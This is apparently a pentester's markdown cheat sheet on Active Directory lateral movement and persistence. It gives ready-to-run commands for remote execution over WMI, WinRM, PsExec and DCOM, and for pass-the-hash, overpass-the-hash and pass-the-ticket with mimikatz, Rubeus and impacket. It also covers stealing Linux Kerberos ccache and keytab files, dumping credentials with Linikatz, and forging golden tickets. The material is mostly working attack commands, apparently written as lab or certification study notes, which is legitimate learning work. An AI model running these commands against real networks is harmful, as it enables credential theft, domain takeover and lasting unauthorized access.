Note: These techniques do not have any remote UAC restrictions since they only apply to non-domain jointed machines. This means that in domain-jointed machine the techniques can run with domain user's full privileges. 

* Lateral Movement techniques:
	* WMI and WinRM:
		* Using wmi:
			* wmic: `wmic /node:<ip> /user:<user> /password:<password> process call create "command"`
			* wmi using dcom in powershell:
				* `$Options = New-CimSessionOption -Protocol DCOM`
				* `$Session = New-Cimsession -ComputerName <ip> -Credential <PSCredential object> -SessionOption $Options`
				* `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =<Command>};`
		* WinRM using winrs: `winrs -r:<target> -u:<user> -p:<password> "<command>"`
			* For winrs to work, the domain user must be Administrators or Remote Management Users on the target host. 
		* WinRM using PowerShell remoting: `New-PSSession -ComputerName <ip> -Credential <PSCredential object>`
		* WinRM using `evil-winrm` on kali
	- PsExec: `./PsExec64.exe -i  \\<domain> -u <domain>\<user> -p <domain> <command>`
		- The user that authenticates to the target machine needs to be part of the Administrators local group
		- Requires ADMIN$ share and file and printer sharing enabled.
	- DCOM: DCOM's MMC Application Class allows the creation of Application Objects which allows execution of shell commands.
		- Requires local administrator on target machine.
		- `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<ip>"))`
		- `$dcom.Document.ActiveView.ExecuteShellCommand("<cmd/powershell>",$null,"<commadn>","7")`
	- Pass the Hash: Use NTLM hash of user to authenticate to wmi or psxec or winrm.
		- The user that authenticates to the target machine needs to be part of the Administrators local group
		- Requires ADMIN$ share and file and printer sharing enabled.
		- wmi using impacket on linux: `impacket-wmiexec -hashes :<ntlm hash> <user>@<ip>`
		- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash): PowerShell scripts to use on windows host to perform pth attacks for lateral movement.
		- Crackmapexec: Attempt login into all hosts in subnet with pth and execute command.
			- `crackmapexec smb <cidr notation> -u <user> -d <domain> -H <hash> [-x <command>]`
	- Pass the Key or OverPass the Hash: Use NTLM hash to request for Kerberos tickets.
		 * Run command as another user using ptt on mimikatz: `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm> /run:<command>`
		- Using Rubeus: 
			- Extract Kerberos keys using mimikatz: `sekurlsa::ekeys`
			- Generate ticket: `Rubeus.exe asktgt /domain:<domain> /user:<user> /</rc4|/aes128|/aes256|/des>:<kerberos key> /nowrap`
		- One use case is using Psexec, powershell remoting on to authenticate to another host using Kerberos instead of authenticating with a password. 
		- **Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
	- Pass the Ticket: A kereberos ticket can be exported and reinjected into memory of another user session or machine in the network to use the ticket.
		- mimikatz exporting tickets: `sekurlsa::tickets /export`
			- Tickets are stored as `.kirbi` files.
			- Inject ticket into memory: `kerberos::ptt <ticket kirbi file>`
			- Exit mimikatz or use `misc:cmd` and execute commands.
		- Using Rubeus: 
			- Dump tickets: `Rubeus.exe dump /nowrap`
			- Get ticket from tgt, inject into session: `Rubeus.exe asktgt /domain:inlanefreight.htb /user:<user> /rc4:<rc4> /ptt`
			- Injecting a ticket into session: `Rubeus.exe ptt /ticket:<.kirbi file>`
			- Injecting a ticket into session (base64):
				- Convert ticket to base64: `Convert]::ToBase64String([IO.File]::ReadAllBytes("<.kirbi file>"))`
				- Inject ticket: `Rubeus.exe ptt /ticket:<bas64 of .kirbi file>`
		- One use case is using Psexec, powershell remoting on to authenticate to another host using Kerberos instead of authenticating with a password. 
	- Linux Pass the hash and pass the ticket:
		- Checking if host is domain joined:
			- `realm list`
				- Command also displays AD user and groups allowed to login. 
			- Alternatives: `sssd`, `winbind`
			- `ps -ef | grep -i "winbind\|sssd"`
		- ccache files: 
			- These files are Kerberos tickets stored in `/tmp` directory or location specified in `KRB5CCNAME` environment variables. .
			- Requires root privileges to read, write.
			- Check environmental variables: `env | grep -i krb5`
			- Checking for ccache files in `/tmp`: `ls -la /tmp`
			- Abusing ccache:
				- Copy file to a separate location: `cp <ccache file> .`
				- Importing ccache file: `export KRB5CCNAME=<ccache file>`
				- Check if the ticket is properly cached: `klist`
		- keytab files: 
			- A keytab is a file containing pairs of Kerberos principals and encrypted key.
			- Keytab files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction or access to a password stored in a plain text file
			- Finding keytab files: 
				- `find / -name *keytab* -ls 2>/dev/null`
				- Check Cron jobs: `crontab -l`
				- Check for usage of `kinit` which allows interaction with Kerberos in scripts.
				- Using klist `klist -k -t`
			- Abusing keytab: 
				- `kinit <user>@<DOMAIN> -k -t <keytab file path>` (make sure username is lowercase, and the domain name is uppercase.)
			- Keytab secrets extraction:
				- `python3 keytabextract.py <keytab file path>`
		- Can use `-k` with most linux tools that interact with various windows services (xfreerdp, smbclient, impacket tools etc).
		- [Linikatz](https://github.com/CiscoCXSecurity/linikatz): Dump all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc 
			- Requires root.\
			- Extracts the credentials, it places them in a folder whose name starts with `linikatz.`
		- Conversion from ccache to kirbi: `impacket-ticketConverter <ccache file> <kirbi file>`
		- Conversion from kirbi to cache: `impacket-ticketConverter <kirbi file> <ccache file>`
* Persistence techniques:
	- Golden Ticket: Forge a ticket with Kerberos account ntlm hash and use it to access any resource in the domain.
		- Required:
			- krbtgt account ntlm hash.
			- User's domain SID
				- Use `whoami /user` and remove the RID (end part of the SID from command output)
		* mimikatz: `kerberos::golden /user:<user> /domain:<domain> /sid:<domain sid> /krbtgt:<krbtgt ntlm> /ptt`
		* Use `misc:cmd` to open a new terminal with elevated privileges.
	